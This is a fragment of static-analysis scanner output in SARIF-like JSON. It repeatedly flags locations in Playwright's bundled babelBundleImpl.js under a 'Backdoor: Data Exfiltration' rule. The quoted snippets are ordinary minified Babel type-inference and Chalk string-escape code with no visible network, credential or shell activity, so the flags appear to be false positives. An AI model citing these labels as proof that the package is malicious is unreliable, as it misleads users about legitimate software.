                    "text": "\\1$/,Lne=/\\\\(u[a-f\\d]{4}|x[a-f\\d]{2}|.)|([^\\\\])/gi,Mne=new Map([[\"n\",`\n`],[\"r\",\"\\r\"],[\"t\",\"\t\"],[\"b\",\"\\b\"],[\"f\",\"\\f\"],[\"v\",\"\\v\"],[\"0\",\"\\0\"],[\"\\\\\",\"\\\\\"],[\"e\",\"\\x1B\"],[\"a\",\"\\x07\"]]);function pP(e){return e[0]===\"u\"&&e.length===5||e[0]===\"x\"&&e.length===3?String.fromCharCode(parseInt(e.slice(1),16)):Mne.get(e)||e}function Rne(e,t){let r=[],n=t.trim().split(/\\s*,\\s*/g),s;for(let i of n)if(!isNaN(i))r.push(Number(i));else if(s=i.match(jne))r.push(s[2].replace(Lne,(a,o,l)=>o?pP(o):l));else throw new Error(`Invalid Chalk template style argument: ${i} (in style '${e}')`);return r}function qne(e){cP.lastInde",
                    "rendered": {
                      "text": "\\1$/,Lne=/\\\\(u[a-f\\d]{4}|x[a-f\\d]{2}|.)|([^\\\\])/gi,Mne=new Map([[\"n\",`\n`],[\"r\",\"\\r\"],[\"t\",\"\t\"],[\"b\",\"\\b\"],[\"f\",\"\\f\"],[\"v\",\"\\v\"],[\"0\",\"\\0\"],[\"\\\\\",\"\\\\\"],[\"e\",\"\\x1B\"],[\"a\",\"\\x07\"]]);function pP(e){return e[0]===\"u\"&&e.length===5||e[0]===\"x\"&&e.length===3?String.fromCharCode(parseInt(e.slice(1),16)):Mne.get(e)||e}function Rne(e,t){let r=[],n=t.trim().split(/\\s*,\\s*/g),s;for(let i of n)if(!isNaN(i))r.push(Number(i));else if(s=i.match(jne))r.push(s[2].replace(Lne,(a,o,l)=>o?pP(o):l));else throw new Error(`Invalid Chalk template style argument: ${i} (in style '${e}')`);return r}function qne(e){cP.lastInde",
                      "markdown": "`\\1$/,Lne=/\\\\(u[a-f\\d]{4}|x[a-f\\d]{2}|.)|([^\\\\])/gi,Mne=new Map([[\"n\",`\n`],[\"r\",\"\\r\"],[\"t\",\"\t\"],[\"b\",\"\\b\"],[\"f\",\"\\f\"],[\"v\",\"\\v\"],[\"0\",\"\\0\"],[\"\\\\\",\"\\\\\"],[\"e\",\"\\x1B\"],[\"a\",\"\\x07\"]]);function pP(e){return e[0]===\"u\"&&e.length===5||e[0]===\"x\"&&e.length===3?String.fromCharCode(parseInt(e.slice(1),16)):Mne.get(e)||e}function Rne(e,t){let r=[],n=t.trim().split(/\\s*,\\s*/g),s;for(let i of n)if(!isNaN(i))r.push(Number(i));else if(s=i.match(jne))r.push(s[2].replace(Lne,(a,o,l)=>o?pP(o):l));else throw new Error(`Invalid Chalk template style argument: ${i} (in style '${e}')`);return r}function qne(e){cP.lastInde`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 18,
                  "startColumn": 10612,
                  "endLine": 18,
                  "endColumn": 10617,
                  "snippet": {
                    "text": "i(\"Function\"))}var Gre=_u(\"Array.from\"),Hre=_u(\"Object.keys\"),Yre=_u(\"Object.values\"),Xre=_u(\"Object.entries\");function Jre(){let{callee:e}=this.node;return Hre(e)?Km(ti()):Gre(e)||Yre(e)||Cre(e,{name:\"Array\"})?Km(Fx()):Xre(e)?Km(xre([ti(),Fx()])):Ux(this.get(\"callee\"))}function zre(){return Ux(this.get(\"tag\"))}function Ux(e){if(e=e.resolve(),e.isFunction()){let{node:t}=e;if(t.async)return t.generator?ds(ei(\"AsyncIterator\")):ds(ei(\"Promise\"));if(t.generator)return ds(ei(\"Iterator\"));if(e.node.returnType)return e.node.returnType}}});var Gx=E(hs=>{\"use strict\";Object.defineProperty(hs,\"__esModule\",{v",
                    "rendered": {
                      "text": "i(\"Function\"))}var Gre=_u(\"Array.from\"),Hre=_u(\"Object.keys\"),Yre=_u(\"Object.values\"),Xre=_u(\"Object.entries\");function Jre(){let{callee:e}=this.node;return Hre(e)?Km(ti()):Gre(e)||Yre(e)||Cre(e,{name:\"Array\"})?Km(Fx()):Xre(e)?Km(xre([ti(),Fx()])):Ux(this.get(\"callee\"))}function zre(){return Ux(this.get(\"tag\"))}function Ux(e){if(e=e.resolve(),e.isFunction()){let{node:t}=e;if(t.async)return t.generator?ds(ei(\"AsyncIterator\")):ds(ei(\"Promise\"));if(t.generator)return ds(ei(\"Iterator\"));if(e.node.returnType)return e.node.returnType}}});var Gx=E(hs=>{\"use strict\";Object.defineProperty(hs,\"__esModule\",{v",
                      "markdown": "`i(\"Function\"))}var Gre=_u(\"Array.from\"),Hre=_u(\"Object.keys\"),Yre=_u(\"Object.values\"),Xre=_u(\"Object.entries\");function Jre(){let{callee:e}=this.node;return Hre(e)?Km(ti()):Gre(e)||Yre(e)||Cre(e,{name:\"Array\"})?Km(Fx()):Xre(e)?Km(xre([ti(),Fx()])):Ux(this.get(\"callee\"))}function zre(){return Ux(this.get(\"tag\"))}function Ux(e){if(e=e.resolve(),e.isFunction()){let{node:t}=e;if(t.async)return t.generator?ds(ei(\"AsyncIterator\")):ds(ei(\"Promise\"));if(t.generator)return ds(ei(\"Iterator\"));if(e.node.returnType)return e.node.returnType}}});var Gx=E(hs=>{\"use strict\";Object.defineProperty(hs,\"__esModule\",{v`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 18,
                  "startColumn": 10567,
                  "endLine": 18,
                  "endColumn": 10572,
                  "snippet": {
                    "text": "}qx.validParent=!0;function Kre(){return ds(ei(\"Function\"))}var Gre=_u(\"Array.from\"),Hre=_u(\"Object.keys\"),Yre=_u(\"Object.values\"),Xre=_u(\"Object.entries\");function Jre(){let{callee:e}=this.node;return Hre(e)?Km(ti()):Gre(e)||Yre(e)||Cre(e,{name:\"Array\"})?Km(Fx()):Xre(e)?Km(xre([ti(),Fx()])):Ux(this.get(\"callee\"))}function zre(){return Ux(this.get(\"tag\"))}function Ux(e){if(e=e.resolve(),e.isFunction()){let{node:t}=e;if(t.async)return t.generator?ds(ei(\"AsyncIterator\")):ds(ei(\"Promise\"));if(t.generator)return ds(ei(\"Iterator\"));if(e.node.returnType)return e.node.returnType}}});var Gx=E(hs=>{\"use str",
                    "rendered": {
                      "text": "}qx.validParent=!0;function Kre(){return ds(ei(\"Function\"))}var Gre=_u(\"Array.from\"),Hre=_u(\"Object.keys\"),Yre=_u(\"Object.values\"),Xre=_u(\"Object.entries\");function Jre(){let{callee:e}=this.node;return Hre(e)?Km(ti()):Gre(e)||Yre(e)||Cre(e,{name:\"Array\"})?Km(Fx()):Xre(e)?Km(xre([ti(),Fx()])):Ux(this.get(\"callee\"))}function zre(){return Ux(this.get(\"tag\"))}function Ux(e){if(e=e.resolve(),e.isFunction()){let{node:t}=e;if(t.async)return t.generator?ds(ei(\"AsyncIterator\")):ds(ei(\"Promise\"));if(t.generator)return ds(ei(\"Iterator\"));if(e.node.returnType)return e.node.returnType}}});var Gx=E(hs=>{\"use str",
                      "markdown": "`}qx.validParent=!0;function Kre(){return ds(ei(\"Function\"))}var Gre=_u(\"Array.from\"),Hre=_u(\"Object.keys\"),Yre=_u(\"Object.values\"),Xre=_u(\"Object.entries\");function Jre(){let{callee:e}=this.node;return Hre(e)?Km(ti()):Gre(e)||Yre(e)||Cre(e,{name:\"Array\"})?Km(Fx()):Xre(e)?Km(xre([ti(),Fx()])):Ux(this.get(\"callee\"))}function zre(){return Ux(this.get(\"tag\"))}function Ux(e){if(e=e.resolve(),e.isFunction()){let{node:t}=e;if(t.async)return t.generator?ds(ei(\"AsyncIterator\")):ds(ei(\"Promise\"));if(t.generator)return ds(ei(\"Iterator\"));if(e.node.returnType)return e.node.returnType}}});var Gx=E(hs=>{\"use str`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 18,
                  "startColumn": 9917,
                  "endLine": 18,
                  "endColumn": 9922,
                  "snippet": {
                    "text": "ction Bre(){let e=[this.get(\"consequent\").getTypeAnnotation(),this.get(\"alternate\").getTypeAnnotation()];return(0,jx.createUnionType)(e)}function Fre(){return this.get(\"expressions\").pop().getTypeAnnotation()}function jre(){return this.get(\"expression\").getTypeAnnotation()}function Lre(){return this.get(\"right\").getTypeAnnotation()}function Mre(e){let t=e.operator;if(t===\"++\"||t===\"--\")return $i()}function Rre(){return ti()}function qre(){return $i()}function Ure(){return Gm()}function Vre(){return Sre()}function $re(){return ds(ei(\"RegExp\"))}function Wre(){return ds(ei(\"Object\"))}function Rx(){ret",
                    "rendered": {
                      "text": "ction Bre(){let e=[this.get(\"consequent\").getTypeAnnotation(),this.get(\"alternate\").getTypeAnnotation()];return(0,jx.createUnionType)(e)}function Fre(){return this.get(\"expressions\").pop().getTypeAnnotation()}function jre(){return this.get(\"expression\").getTypeAnnotation()}function Lre(){return this.get(\"right\").getTypeAnnotation()}function Mre(e){let t=e.operator;if(t===\"++\"||t===\"--\")return $i()}function Rre(){return ti()}function qre(){return $i()}function Ure(){return Gm()}function Vre(){return Sre()}function $re(){return ds(ei(\"RegExp\"))}function Wre(){return ds(ei(\"Object\"))}function Rx(){ret",
                      "markdown": "`ction Bre(){let e=[this.get(\"consequent\").getTypeAnnotation(),this.get(\"alternate\").getTypeAnnotation()];return(0,jx.createUnionType)(e)}function Fre(){return this.get(\"expressions\").pop().getTypeAnnotation()}function jre(){return this.get(\"expression\").getTypeAnnotation()}function Lre(){return this.get(\"right\").getTypeAnnotation()}function Mre(e){let t=e.operator;if(t===\"++\"||t===\"--\")return $i()}function Rre(){return ti()}function qre(){return $i()}function Ure(){return Gm()}function Vre(){return Sre()}function $re(){return ds(ei(\"RegExp\"))}function Wre(){return ds(ei(\"Object\"))}function Rx(){ret`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 18,
                  "startColumn": 9852,
                  "endLine": 18,
                  "endColumn": 9857,
                  "snippet": {
                    "text": "\"right\").getTypeAnnotation()];return(0,jx.createUnionType)(e)}function Bre(){let e=[this.get(\"consequent\").getTypeAnnotation(),this.get(\"alternate\").getTypeAnnotation()];return(0,jx.createUnionType)(e)}function Fre(){return this.get(\"expressions\").pop().getTypeAnnotation()}function jre(){return this.get(\"expression\").getTypeAnnotation()}function Lre(){return this.get(\"right\").getTypeAnnotation()}function Mre(e){let t=e.operator;if(t===\"++\"||t===\"--\")return $i()}function Rre(){return ti()}function qre(){return $i()}function Ure(){return Gm()}function Vre(){return Sre()}function $re(){return ds(ei(\"R",
                    "rendered": {
                      "text": "\"right\").getTypeAnnotation()];return(0,jx.createUnionType)(e)}function Bre(){let e=[this.get(\"consequent\").getTypeAnnotation(),this.get(\"alternate\").getTypeAnnotation()];return(0,jx.createUnionType)(e)}function Fre(){return this.get(\"expressions\").pop().getTypeAnnotation()}function jre(){return this.get(\"expression\").getTypeAnnotation()}function Lre(){return this.get(\"right\").getTypeAnnotation()}function Mre(e){let t=e.operator;if(t===\"++\"||t===\"--\")return $i()}function Rre(){return ti()}function qre(){return $i()}function Ure(){return Gm()}function Vre(){return Sre()}function $re(){return ds(ei(\"R",
                      "markdown": "`\"right\").getTypeAnnotation()];return(0,jx.createUnionType)(e)}function Bre(){let e=[this.get(\"consequent\").getTypeAnnotation(),this.get(\"alternate\").getTypeAnnotation()];return(0,jx.createUnionType)(e)}function Fre(){return this.get(\"expressions\").pop().getTypeAnnotation()}function jre(){return this.get(\"expression\").getTypeAnnotation()}function Lre(){return this.get(\"right\").getTypeAnnotation()}function Mre(e){let t=e.operator;if(t===\"++\"||t===\"--\")return $i()}function Rre(){return ti()}function qre(){return $i()}function Ure(){return Gm()}function Vre(){return Sre()}function $re(){return ds(ei(\"R`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 18,
                  "startColumn": 9780,
                  "endLine": 18,
                  "endColumn": 9785,
                  "snippet": {
                    "text": "])}}function kre(){let e=[this.get(\"left\").getTypeAnnotation(),this.get(\"right\").getTypeAnnotation()];return(0,jx.createUnionType)(e)}function Bre(){let e=[this.get(\"consequent\").getTypeAnnotation(),this.get(\"alternate\").getTypeAnnotation()];return(0,jx.createUnionType)(e)}function Fre(){return this.get(\"expressions\").pop().getTypeAnnotation()}function jre(){return this.get(\"expression\").getTypeAnnotation()}function Lre(){return this.get(\"right\").getTypeAnnotation()}function Mre(e){let t=e.operator;if(t===\"++\"||t===\"--\")return $i()}function Rre(){return ti()}function qre(){return $i()}function Ure(",
                    "rendered": {
                      "text": "])}}function kre(){let e=[this.get(\"left\").getTypeAnnotation(),this.get(\"right\").getTypeAnnotation()];return(0,jx.createUnionType)(e)}function Bre(){let e=[this.get(\"consequent\").getTypeAnnotation(),this.get(\"alternate\").getTypeAnnotation()];return(0,jx.createUnionType)(e)}function Fre(){return this.get(\"expressions\").pop().getTypeAnnotation()}function jre(){return this.get(\"expression\").getTypeAnnotation()}function Lre(){return this.get(\"right\").getTypeAnnotation()}function Mre(e){let t=e.operator;if(t===\"++\"||t===\"--\")return $i()}function Rre(){return ti()}function qre(){return $i()}function Ure(",
                      "markdown": "`])}}function kre(){let e=[this.get(\"left\").getTypeAnnotation(),this.get(\"right\").getTypeAnnotation()];return(0,jx.createUnionType)(e)}function Bre(){let e=[this.get(\"consequent\").getTypeAnnotation(),this.get(\"alternate\").getTypeAnnotation()];return(0,jx.createUnionType)(e)}function Fre(){return this.get(\"expressions\").pop().getTypeAnnotation()}function jre(){return this.get(\"expression\").getTypeAnnotation()}function Lre(){return this.get(\"right\").getTypeAnnotation()}function Mre(e){let t=e.operator;if(t===\"++\"||t===\"--\")return $i()}function Rre(){return ti()}function qre(){return $i()}function Ure(`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 18,
                  "startColumn": 9683,
                  "endLine": 18,
                  "endColumn": 9688,
                  "snippet": {
                    "text": ")&&r.isBaseType(\"number\")?$i():n.isBaseType(\"string\")||r.isBaseType(\"string\")?ti():Pre([ti(),$i()])}}function kre(){let e=[this.get(\"left\").getTypeAnnotation(),this.get(\"right\").getTypeAnnotation()];return(0,jx.createUnionType)(e)}function Bre(){let e=[this.get(\"consequent\").getTypeAnnotation(),this.get(\"alternate\").getTypeAnnotation()];return(0,jx.createUnionType)(e)}function Fre(){return this.get(\"expressions\").pop().getTypeAnnotation()}function jre(){return this.get(\"expression\").getTypeAnnotation()}function Lre(){return this.get(\"right\").getTypeAnnotation()}function Mre(e){let t=e.operator;if(t",
                    "rendered": {
                      "text": ")&&r.isBaseType(\"number\")?$i():n.isBaseType(\"string\")||r.isBaseType(\"string\")?ti():Pre([ti(),$i()])}}function kre(){let e=[this.get(\"left\").getTypeAnnotation(),this.get(\"right\").getTypeAnnotation()];return(0,jx.createUnionType)(e)}function Bre(){let e=[this.get(\"consequent\").getTypeAnnotation(),this.get(\"alternate\").getTypeAnnotation()];return(0,jx.createUnionType)(e)}function Fre(){return this.get(\"expressions\").pop().getTypeAnnotation()}function jre(){return this.get(\"expression\").getTypeAnnotation()}function Lre(){return this.get(\"right\").getTypeAnnotation()}function Mre(e){let t=e.operator;if(t",
                      "markdown": "`)&&r.isBaseType(\"number\")?$i():n.isBaseType(\"string\")||r.isBaseType(\"string\")?ti():Pre([ti(),$i()])}}function kre(){let e=[this.get(\"left\").getTypeAnnotation(),this.get(\"right\").getTypeAnnotation()];return(0,jx.createUnionType)(e)}function Bre(){let e=[this.get(\"consequent\").getTypeAnnotation(),this.get(\"alternate\").getTypeAnnotation()];return(0,jx.createUnionType)(e)}function Fre(){return this.get(\"expressions\").pop().getTypeAnnotation()}function jre(){return this.get(\"expression\").getTypeAnnotation()}function Lre(){return this.get(\"right\").getTypeAnnotation()}function Mre(e){let t=e.operator;if(t`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 18,
                  "startColumn": 9640,
                  "endLine": 18,
                  "endColumn": 9645,
                  "snippet": {
                    "text": "is.get(\"left\");return n.isBaseType(\"number\")&&r.isBaseType(\"number\")?$i():n.isBaseType(\"string\")||r.isBaseType(\"string\")?ti():Pre([ti(),$i()])}}function kre(){let e=[this.get(\"left\").getTypeAnnotation(),this.get(\"right\").getTypeAnnotation()];return(0,jx.createUnionType)(e)}function Bre(){let e=[this.get(\"consequent\").getTypeAnnotation(),this.get(\"alternate\").getTypeAnnotation()];return(0,jx.createUnionType)(e)}function Fre(){return this.get(\"expressions\").pop().getTypeAnnotation()}function jre(){return this.get(\"expression\").getTypeAnnotation()}function Lre(){return this.get(\"right\").getTypeAnnotat",
                    "rendered": {
                      "text": "is.get(\"left\");return n.isBaseType(\"number\")&&r.isBaseType(\"number\")?$i():n.isBaseType(\"string\")||r.isBaseType(\"string\")?ti():Pre([ti(),$i()])}}function kre(){let e=[this.get(\"left\").getTypeAnnotation(),this.get(\"right\").getTypeAnnotation()];return(0,jx.createUnionType)(e)}function Bre(){let e=[this.get(\"consequent\").getTypeAnnotation(),this.get(\"alternate\").getTypeAnnotation()];return(0,jx.createUnionType)(e)}function Fre(){return this.get(\"expressions\").pop().getTypeAnnotation()}function jre(){return this.get(\"expression\").getTypeAnnotation()}function Lre(){return this.get(\"right\").getTypeAnnotat",
                      "markdown": "`is.get(\"left\");return n.isBaseType(\"number\")&&r.isBaseType(\"number\")?$i():n.isBaseType(\"string\")||r.isBaseType(\"string\")?ti():Pre([ti(),$i()])}}function kre(){let e=[this.get(\"left\").getTypeAnnotation(),this.get(\"right\").getTypeAnnotation()];return(0,jx.createUnionType)(e)}function Bre(){let e=[this.get(\"consequent\").getTypeAnnotation(),this.get(\"alternate\").getTypeAnnotation()];return(0,jx.createUnionType)(e)}function Fre(){return this.get(\"expressions\").pop().getTypeAnnotation()}function jre(){return this.get(\"expression\").getTypeAnnotation()}function Lre(){return this.get(\"right\").getTypeAnnotat`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 18,
                  "startColumn": 9547,
                  "endLine": 18,
                  "endColumn": 9552,
                  "snippet": {
                    "text": "f(t)>=0)return $i();if(gre.indexOf(t)>=0)return Gm();if(t===\"+\"){let r=this.get(\"right\"),n=this.get(\"left\");return n.isBaseType(\"number\")&&r.isBaseType(\"number\")?$i():n.isBaseType(\"string\")||r.isBaseType(\"string\")?ti():Pre([ti(),$i()])}}function kre(){let e=[this.get(\"left\").getTypeAnnotation(),this.get(\"right\").getTypeAnnotation()];return(0,jx.createUnionType)(e)}function Bre(){let e=[this.get(\"consequent\").getTypeAnnotation(),this.get(\"alternate\").getTypeAnnotation()];return(0,jx.createUnionType)(e)}function Fre(){return this.get(\"expressions\").pop().getTypeAnnotation()}function jre(){return this",
                    "rendered": {
                      "text": "f(t)>=0)return $i();if(gre.indexOf(t)>=0)return Gm();if(t===\"+\"){let r=this.get(\"right\"),n=this.get(\"left\");return n.isBaseType(\"number\")&&r.isBaseType(\"number\")?$i():n.isBaseType(\"string\")||r.isBaseType(\"string\")?ti():Pre([ti(),$i()])}}function kre(){let e=[this.get(\"left\").getTypeAnnotation(),this.get(\"right\").getTypeAnnotation()];return(0,jx.createUnionType)(e)}function Bre(){let e=[this.get(\"consequent\").getTypeAnnotation(),this.get(\"alternate\").getTypeAnnotation()];return(0,jx.createUnionType)(e)}function Fre(){return this.get(\"expressions\").pop().getTypeAnnotation()}function jre(){return this",
                      "markdown": "`f(t)>=0)return $i();if(gre.indexOf(t)>=0)return Gm();if(t===\"+\"){let r=this.get(\"right\"),n=this.get(\"left\");return n.isBaseType(\"number\")&&r.isBaseType(\"number\")?$i():n.isBaseType(\"string\")||r.isBaseType(\"string\")?ti():Pre([ti(),$i()])}}function kre(){let e=[this.get(\"left\").getTypeAnnotation(),this.get(\"right\").getTypeAnnotation()];return(0,jx.createUnionType)(e)}function Bre(){let e=[this.get(\"consequent\").getTypeAnnotation(),this.get(\"alternate\").getTypeAnnotation()];return(0,jx.createUnionType)(e)}function Fre(){return this.get(\"expressions\").pop().getTypeAnnotation()}function jre(){return this`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 18,
                  "startColumn": 9510,
                  "endLine": 18,
                  "endColumn": 9515,
                  "snippet": {
                    "text": "Nre(e){let t=e.operator;if(Ere.indexOf(t)>=0)return $i();if(gre.indexOf(t)>=0)return Gm();if(t===\"+\"){let r=this.get(\"right\"),n=this.get(\"left\");return n.isBaseType(\"number\")&&r.isBaseType(\"number\")?$i():n.isBaseType(\"string\")||r.isBaseType(\"string\")?ti():Pre([ti(),$i()])}}function kre(){let e=[this.get(\"left\").getTypeAnnotation(),this.get(\"right\").getTypeAnnotation()];return(0,jx.createUnionType)(e)}function Bre(){let e=[this.get(\"consequent\").getTypeAnnotation(),this.get(\"alternate\").getTypeAnnotation()];return(0,jx.createUnionType)(e)}function Fre(){return this.get(\"expressions\").pop().getTypeAn",
                    "rendered": {
                      "text": "Nre(e){let t=e.operator;if(Ere.indexOf(t)>=0)return $i();if(gre.indexOf(t)>=0)return Gm();if(t===\"+\"){let r=this.get(\"right\"),n=this.get(\"left\");return n.isBaseType(\"number\")&&r.isBaseType(\"number\")?$i():n.isBaseType(\"string\")||r.isBaseType(\"string\")?ti():Pre([ti(),$i()])}}function kre(){let e=[this.get(\"left\").getTypeAnnotation(),this.get(\"right\").getTypeAnnotation()];return(0,jx.createUnionType)(e)}function Bre(){let e=[this.get(\"consequent\").getTypeAnnotation(),this.get(\"alternate\").getTypeAnnotation()];return(0,jx.createUnionType)(e)}function Fre(){return this.get(\"expressions\").pop().getTypeAn",
                      "markdown": "`Nre(e){let t=e.operator;if(Ere.indexOf(t)>=0)return $i();if(gre.indexOf(t)>=0)return Gm();if(t===\"+\"){let r=this.get(\"right\"),n=this.get(\"left\");return n.isBaseType(\"number\")&&r.isBaseType(\"number\")?$i():n.isBaseType(\"string\")||r.isBaseType(\"string\")?ti():Pre([ti(),$i()])}}function kre(){let e=[this.get(\"left\").getTypeAnnotation(),this.get(\"right\").getTypeAnnotation()];return(0,jx.createUnionType)(e)}function Bre(){let e=[this.get(\"consequent\").getTypeAnnotation(),this.get(\"alternate\").getTypeAnnotation()];return(0,jx.createUnionType)(e)}function Fre(){return this.get(\"expressions\").pop().getTypeAn`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 18,
                  "startColumn": 9342,
                  "endLine": 18,
                  "endColumn": 9347,
                  "snippet": {
                    "text": "function _re(e){let t=e.operator;if(t===\"void\")return Are();if(vre.indexOf(t)>=0)return $i();if(Tre.indexOf(t)>=0)return ti();if(bre.indexOf(t)>=0)return Gm()}function Nre(e){let t=e.operator;if(Ere.indexOf(t)>=0)return $i();if(gre.indexOf(t)>=0)return Gm();if(t===\"+\"){let r=this.get(\"right\"),n=this.get(\"left\");return n.isBaseType(\"number\")&&r.isBaseType(\"number\")?$i():n.isBaseType(\"string\")||r.isBaseType(\"string\")?ti():Pre([ti(),$i()])}}function kre(){let e=[this.get(\"left\").getTypeAnnotation(),this.get(\"right\").getTypeAnnotation()];return(0,jx.createUnionType)(e)}function Bre(){let e=[this.get(\"c",
                    "rendered": {
                      "text": "function _re(e){let t=e.operator;if(t===\"void\")return Are();if(vre.indexOf(t)>=0)return $i();if(Tre.indexOf(t)>=0)return ti();if(bre.indexOf(t)>=0)return Gm()}function Nre(e){let t=e.operator;if(Ere.indexOf(t)>=0)return $i();if(gre.indexOf(t)>=0)return Gm();if(t===\"+\"){let r=this.get(\"right\"),n=this.get(\"left\");return n.isBaseType(\"number\")&&r.isBaseType(\"number\")?$i():n.isBaseType(\"string\")||r.isBaseType(\"string\")?ti():Pre([ti(),$i()])}}function kre(){let e=[this.get(\"left\").getTypeAnnotation(),this.get(\"right\").getTypeAnnotation()];return(0,jx.createUnionType)(e)}function Bre(){let e=[this.get(\"c",
                      "markdown": "`function _re(e){let t=e.operator;if(t===\"void\")return Are();if(vre.indexOf(t)>=0)return $i();if(Tre.indexOf(t)>=0)return ti();if(bre.indexOf(t)>=0)return Gm()}function Nre(e){let t=e.operator;if(Ere.indexOf(t)>=0)return $i();if(gre.indexOf(t)>=0)return Gm();if(t===\"+\"){let r=this.get(\"right\"),n=this.get(\"left\");return n.isBaseType(\"number\")&&r.isBaseType(\"number\")?$i():n.isBaseType(\"string\")||r.isBaseType(\"string\")?ti():Pre([ti(),$i()])}}function kre(){let e=[this.get(\"left\").getTypeAnnotation(),this.get(\"right\").getTypeAnnotation()];return(0,jx.createUnionType)(e)}function Bre(){let e=[this.get(\"c`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 18,
                  "startColumn": 9322,
                  "endLine": 18,
                  "endColumn": 9327,
                  "snippet": {
